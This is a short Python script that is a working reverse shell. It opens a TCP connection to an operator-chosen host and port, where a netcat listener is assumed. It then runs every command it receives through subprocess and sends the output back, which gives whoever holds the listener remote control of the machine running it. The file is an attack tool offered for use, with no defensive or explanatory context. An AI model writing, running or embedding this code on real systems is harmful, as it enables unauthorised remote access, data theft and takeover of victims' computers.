import socket
import subprocess

# Port and IP 
HOST = '192.168.0.1'  # Your IP address
PORT = 1234 #Your Port in nc

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode("utf-8")
    
    if command.lower() == "exit":
        break
    
    output = subprocess.getoutput(command)
    
    s.send(output.encode("utf-8"))

s.close()
